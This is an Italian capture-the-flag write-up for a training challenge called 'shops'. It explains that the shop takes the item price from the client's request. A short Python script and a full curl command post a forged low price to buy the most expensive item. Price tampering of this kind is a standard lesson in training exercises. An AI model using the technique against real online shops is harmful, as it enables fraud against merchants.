> Wow questo sito vende delle "flag" stupende, ma quella che voglio io costa troppo. Mi puoi aiutare?

Ci sono tre "flag" in vendita; una da 10 euro ("Bandiera francese", id=0), una da 100 euro ("Bandiera italiana", id=1), e l'ultima da 1000 euro ("Bandiera anonymous", id=2). Il nostro budget è 100 euro e noi dobbiamo riuscire ad avere l'ultima. Il costo di questa viene passato nel corpo della richiesta; creiamo dunque una richiesta con un costo falso qualsiasi in un intervallo da 0 al budget disponibile, e lo stesso id dell'articolo (2).

Con un velocissimo script python:

```python
import requests

URL = 'http://shops.challs.olicyber.it/buy.php'
print(requests.post(URL, data={'costo': '100', 'id': '2'}).text)
```

Oppure:
```bash
curl 'http://shops.challs.olicyber.it/buy.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: it,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://shops.challs.olicyber.it' \
  -H 'Referer: http://shops.challs.olicyber.it/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw 'id=2&costo=100' \
  --compressed \
  --insecure
```